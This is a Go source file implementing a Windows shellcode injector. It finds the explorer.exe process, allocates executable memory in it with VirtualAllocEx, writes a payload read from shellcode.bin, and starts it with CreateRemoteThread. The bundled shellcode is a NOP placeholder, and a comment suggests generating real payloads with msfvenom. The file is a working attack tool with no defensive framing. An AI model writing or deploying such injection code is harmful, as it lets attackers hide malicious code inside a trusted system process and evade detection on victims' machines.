package main

import (
	"os"
    "fmt"
    "strings"
    "syscall"
    "unsafe"
)

// Import Windows API functions
var (
    kernel32           = syscall.NewLazyDLL("kernel32.dll")
    openProcess        = kernel32.NewProc("OpenProcess")
    virtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
    writeProcessMemory = kernel32.NewProc("WriteProcessMemory")
    createRemoteThread = kernel32.NewProc("CreateRemoteThread")
    psapi              = syscall.NewLazyDLL("psapi.dll")
    enumProcesses      = psapi.NewProc("EnumProcesses")
    getModuleBaseName  = psapi.NewProc("GetModuleBaseNameW")
)

// Process access rights
const (
    PROCESS_ALL_ACCESS     = 0x1F0FFF
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

// Example shellcode (NOP sled for demonstration)
var shellcode = []byte{
    0x90, 0x90, 0x90, // NOP instructions (replace with real shellcode)
    // Normally, you would insert shellcode generated with msfvenom or another tool
}

// VBS to shellcode converter
func VBSToShellcode(vbs string) []byte {
    // Example VBS: "0x90,0x90,0x90"
    vbs = strings.ReplaceAll(vbs, " ", "")
    vbs = strings.ReplaceAll(vbs, "\n", "")
    parts := strings.Split(vbs, ",")
    var sc []byte
    for _, part := range parts {
        part = strings.TrimPrefix(part, "0x")
        if len(part) == 0 {
            continue
        }
        var b byte
        fmt.Sscanf(part, "%02x", &b)
        sc = append(sc, b)
    }
    return sc
}

// Find PID of explorer.exe
func FindExplorerPID() (uint32, error) {
    const maxProcs = 1024
    var pids [maxProcs]uint32
    var bytesReturned uint32

    r1, _, err := enumProcesses.Call(
        uintptr(unsafe.Pointer(&pids[0])),
        uintptr(maxProcs*4),
        uintptr(unsafe.Pointer(&bytesReturned)),
    )
    if r1 == 0 {
        return 0, fmt.Errorf("EnumProcesses failed: %v", err)
    }
    numProcs := bytesReturned / 4

    for i := 0; i < int(numProcs); i++ {
        pid := pids[i]
        hProcess, _, _ := openProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
        if hProcess == 0 {
            continue
        }
        var nameBuf [260]uint16
        r2, _, _ := getModuleBaseName.Call(
            hProcess,
            0,
            uintptr(unsafe.Pointer(&nameBuf[0])),
            uintptr(len(nameBuf)),
        )
        syscall.CloseHandle(syscall.Handle(hProcess))
        if r2 == 0 {
            continue
        }
        name := syscall.UTF16ToString(nameBuf[:])
        if strings.EqualFold(name, "explorer.exe") {
            return pid, nil
        }
    }
    return 0, fmt.Errorf("explorer.exe not found")
}

func InjectShellcode(pid uint32, shellcode []byte) error {
    // Open target process
    hProcess, _, _ := openProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
    if hProcess == 0 {
        return fmt.Errorf("unable to open process %d", pid)
    }
    defer syscall.CloseHandle(syscall.Handle(hProcess))

    // Allocate memory in the target process
    addr, _, _ := virtualAllocEx.Call(hProcess, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if addr == 0 {
        return fmt.Errorf("memory allocation failed")
    }

    // Write shellcode into process memory
    _, _, _ = writeProcessMemory.Call(hProcess, addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)

    // Execute shellcode in remote process
    thread, _, _ := createRemoteThread.Call(hProcess, 0, 0, addr, 0, 0, 0)
    if thread == 0 {
        return fmt.Errorf("failed to create remote thread")
    }

    fmt.Println("Shellcode successfully injected!")
    return nil
}

func main() {
    // read VBS shellcode from file
    vbsShellcode, _ := os.ReadFile("shellcode.bin")
    shellcode = VBSToShellcode(string(vbsShellcode))

    pid, err := FindExplorerPID()
    if err != nil {
        fmt.Println("Error finding explorer.exe:", err)
        return
    }
    fmt.Println("Injecting into explorer.exe PID:", pid)

    err = InjectShellcode(pid, shellcode)
    if err != nil {
        fmt.Println("Error:", err)
    } else {
        fmt.Println("Injection completed successfully.")
    }
}